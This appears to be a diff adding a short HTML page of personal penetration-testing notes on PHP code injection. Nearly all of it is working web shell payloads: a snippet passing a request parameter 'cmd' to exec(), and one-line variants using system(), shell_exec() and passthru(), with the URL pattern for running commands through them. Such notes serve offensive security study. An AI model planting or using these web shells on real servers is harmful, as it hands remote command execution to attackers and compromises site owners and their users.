@@ -1,0 +1,23 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Code Injection</title>
+</head><body>Interesting, if you can inject php, set up a vulnerable variable (cmd in this case) to exploit in browser<br/>
+website.com/vulnpage?cmd=&lt;exec command&gt;<br/>
+<br/>
+&#09;&lt;?php <br/>
+&#09;$cmd = ($_REQUEST["cmd"]);<br/>
+&#09;$outt = exec($cmd);<br/>
+&#09;echo "&lt;pre&gt;$outt&lt;/pre&gt;";<br/>
+&#09;?&gt; <br/>
+<br/>
+same as: &lt;?php system($_GET['cmd']); ?&gt;<br/>
+Alternate: <span style="font-family: inherit"><span style="font-size: 10pt">&lt;?php</span></span><span style="font-size: 10pt">&nbsp;<span style="font-family: inherit">echo</span>&nbsp;<span style="font-family: inherit">shell_exec($_GET['cmd'].' 2&gt;&amp;1');</span>&nbsp;<span style="font-family: inherit">?&gt;</span></span>&nbsp; <ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&lt;?php passthru($_GET['cmd']); ?&gt; &nbsp;</li>
+</ul>
+</li>
+</ul>
+<br/>
+See 'Code Exec Functions' page for other potential commands to use.<br/>
+<br/>
+SEC560 has a better shell</body></html>
